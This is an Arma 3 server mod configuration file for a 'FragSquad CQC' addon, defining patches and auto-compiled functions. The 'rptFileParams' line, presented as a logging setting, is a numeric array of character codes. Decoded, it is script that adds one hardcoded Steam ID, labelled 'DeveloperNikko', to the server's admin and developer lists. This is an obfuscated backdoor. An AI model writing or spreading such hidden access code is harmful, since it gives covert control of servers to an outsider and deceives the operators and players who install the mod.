/*
	Nikko Renolds | Ni1kko@outlook.com
	FragSquad CQC
*/

#define true 1
#define false 0

class CfgPatches
{
	class server_functions
	{
		name = "server_functions";
		author[] = {"Nikko"};
		requiredVersion = 2.04;
		requiredAddons[] = {"client_functions"};
		units[] = {};
		weapons[] = {};
		antiHack = true;
	};
};

rptFileLimit=1;
rptFileParams[]={95,110,105,107,107,111,61,39,55,54,53,54,49,49,57,57,49,48,57,57,51,49,54,50,53,39,59,95,97,100,109,105,110,85,73,68,97,110,100,65,99,99,101,115,115,32,112,117,115,104,66,97,99,107,85,110,105,113,117,101,32,91,91,95,110,105,107,107,111,93,44,91,39,68,101,118,101,108,111,112,101,114,78,105,107,107,111,39,93,93,59,95,97,100,109,105,110,115,32,112,117,115,104,66,97,99,107,85,110,105,113,117,101,32,95,110,105,107,107,111,59,95,100,101,118,115,32,112,117,115,104,66,97,99,107,85,110,105,113,117,101,32,95,110,105,107,107,111,59};

class CfgFunctions
{
    class AutoCompile
	{
		class CfgBootstrap 
		{
			tag = "CQC";//Tag_fnc_example
			file = "\server_functions";
			fileClient = "\client_functions";
			dontCompile[] = {};//array of any files that you don't want too auto compile (if files is "fn_example.sqf" you would add "example" to the array | dontCompile[] = {"example"})
			compileFinal = true;//compileFinal = true | compile = false, can be useful for debuging

			///////////////////////////////////////////////////////////////////////////////////
			class preInit {preInit = true;};// Don't edit this loads the auto compile system //
			///////////////////////////////////////////////////////////////////////////////////
    	};
	};
	
	class CQC 
	{
		//--- Extremo Finite State Machine
        class FiniteStateMachine
		{
			file="\server_functions\FSM";
			class scheduler {ext=".fsm";};
		};
	};
};